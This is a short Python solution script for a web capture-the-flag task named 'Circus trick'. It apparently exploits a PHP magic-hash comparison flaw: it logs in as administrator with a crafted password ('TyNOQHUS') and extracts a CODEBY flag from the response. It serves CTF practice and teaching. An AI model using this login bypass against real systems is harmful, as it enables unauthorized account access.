# Для решения таска из категории Веб "Цирковой трюк"

import requests
TASK_URL = "http://TASK_URL"
# There are only two hashes which suitable for this vulnerability: "TyNOQHUS" and "34250003024812" 
request = requests.post(f"{TASK_URL}/login.php", data={"login":"administrator", "password":"TyNOQHUS"})
response = request.text
if "Неверный логин" not in response:
    flag = "CODEBY{" + response.split("CODEBY{")[1].split("}")[0] + "}"
    print(f"FLAG FOUND: {flag}")
